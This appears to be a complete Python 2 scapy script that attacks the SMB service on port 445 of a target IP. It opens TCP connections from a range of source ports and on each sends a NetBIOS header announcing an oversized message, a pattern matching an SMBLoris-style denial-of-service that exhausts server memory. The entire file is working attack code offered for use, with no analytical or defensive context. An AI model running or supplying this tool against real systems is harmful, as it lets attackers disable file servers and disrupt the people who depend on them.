from scapy.all import *
import sys

if len(sys.argv) < 4:
  print "Usage: python smb4 <target-ip> <port0> <numports>"
  exit()

targetip = sys.argv[1]

try:
  p0 = int(sys.argv[2])
except:
  print "Invalid port0 value"
  exit()

try:
  numports = int(sys.argv[3])
except:
  print "Invalid numports value"
  exit()

conf.L3socket
conf.L3socket=L3RawSocket

i = IP()
i.dst = targetip
t = TCP()
t.dport = 445

for p in range(p0, p0+numports):
  print p
  t.sport = p
  t.flags = "S"

  r = sr1(i/t, timeout=2)
  rt = r[TCP]
  t.ack = rt.seq + 1
  t.seq = rt.ack
  t.flags = "A"
  sbss = '\x00\x01\xff\xff'
  send(i/t/sbss)
 
